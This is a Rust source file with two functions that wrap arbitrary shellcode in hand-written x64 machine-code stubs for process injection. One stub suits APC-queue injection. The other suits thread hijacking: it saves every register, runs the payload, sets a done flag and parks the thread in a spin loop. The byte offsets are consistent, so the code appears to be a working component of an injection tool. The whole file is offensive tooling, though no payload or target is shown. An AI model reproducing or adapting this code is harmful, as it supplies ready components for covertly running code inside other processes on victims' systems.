#[rustfmt::skip]
pub fn wrap_for_apc(shellcode: &[u8]) -> Vec<u8> {
    const PROLOGUE: &[u8] = &[
        0x53,                           // push rbx
        0x55,                           // push rbp
        0x57,                           // push rdi
        0x56,                           // push rsi
        0x41, 0x54,                     // push r12
        0x41, 0x55,                     // push r13
        0x41, 0x56,                     // push r14
        0x41, 0x57,                     // push r15
        0x48, 0x83, 0xEC, 0x28,        // sub rsp, 0x28
        0xE8, 0x11, 0x00, 0x00, 0x00,  // call +17 (jump over epilogue to shellcode)
    ];
    const EPILOGUE: &[u8] = &[
        0x48, 0x83, 0xC4, 0x28,        // add rsp, 0x28
        0x41, 0x5F,                     // pop r15
        0x41, 0x5E,                     // pop r14
        0x41, 0x5D,                     // pop r13
        0x41, 0x5C,                     // pop r12
        0x5E,                           // pop rsi
        0x5F,                           // pop rdi
        0x5D,                           // pop rbp
        0x5B,                           // pop rbx
        0xC3,                           // ret
    ];

    let mut wrapped = Vec::with_capacity(PROLOGUE.len() + EPILOGUE.len() + shellcode.len());
    wrapped.extend_from_slice(PROLOGUE);
    wrapped.extend_from_slice(EPILOGUE);
    wrapped.extend_from_slice(shellcode);
    wrapped
}

#[rustfmt::skip]
pub fn wrap_for_hijack(shellcode: &[u8]) -> Vec<u8> {
    const PROLOGUE_SIZE: usize = 36;
    const EPILOGUE_SIZE: usize = 46;

    const PROLOGUE: &[u8] = &[
        0x9C,                               // pushfq
        0x50,                               // push rax
        0x51,                               // push rcx
        0x52,                               // push rdx
        0x53,                               // push rbx
        0x55,                               // push rbp
        0x56,                               // push rsi
        0x57,                               // push rdi
        0x41, 0x50,                         // push r8
        0x41, 0x51,                         // push r9
        0x41, 0x52,                         // push r10
        0x41, 0x53,                         // push r11
        0x41, 0x54,                         // push r12
        0x41, 0x55,                         // push r13
        0x41, 0x56,                         // push r14
        0x41, 0x57,                         // push r15
        0x48, 0x89, 0xE5,                   // mov rbp, rsp (save stack for restoration)
        0x48, 0x83, 0xE4, 0xF0,            // and rsp, -16 (16-byte align)
        0xE8, 0x2E, 0x00, 0x00, 0x00,      // call +46 (jump over epilogue to shellcode)
    ];

    const EPILOGUE: &[u8] = &[
        0xE8, 0x00, 0x00, 0x00, 0x00,      // call $+5
        0x58,                               // pop rax (rax = addr of this pop)
        0x48, 0x05, 0x00, 0x00, 0x00, 0x00, // add rax, <flag_disp> (patched)
        0xC6, 0x00, 0x01,                   // mov byte [rax], 1
        0x48, 0x89, 0xEC,                   // mov rsp, rbp
        0x41, 0x5F,                         // pop r15
        0x41, 0x5E,                         // pop r14
        0x41, 0x5D,                         // pop r13
        0x41, 0x5C,                         // pop r12
        0x41, 0x5B,                         // pop r11
        0x41, 0x5A,                         // pop r10
        0x41, 0x59,                         // pop r9
        0x41, 0x58,                         // pop r8
        0x5F,                               // pop rdi
        0x5E,                               // pop rsi
        0x5D,                               // pop rbp
        0x5B,                               // pop rbx
        0x5A,                               // pop rdx
        0x59,                               // pop rcx
        0x58,                               // pop rax
        0x9D,                               // popfq
        0xF3, 0x90,                         // pause
        0xEB, 0xFC,                         // jmp -4 (back to pause)
    ];

    debug_assert_eq!(PROLOGUE.len(), PROLOGUE_SIZE);
    debug_assert_eq!(EPILOGUE.len(), EPILOGUE_SIZE);

    let flag_disp: u32 = (41 + shellcode.len()) as u32;

    let total = PROLOGUE_SIZE + EPILOGUE_SIZE + shellcode.len() + 1;
    let mut wrapped = Vec::with_capacity(total);
    wrapped.extend_from_slice(PROLOGUE);
    wrapped.extend_from_slice(EPILOGUE);
    wrapped.extend_from_slice(shellcode);
    wrapped.push(0x00);

    let disp_offset = PROLOGUE_SIZE + 8;
    wrapped[disp_offset..disp_offset + 4].copy_from_slice(&flag_disp.to_le_bytes());

    wrapped
}
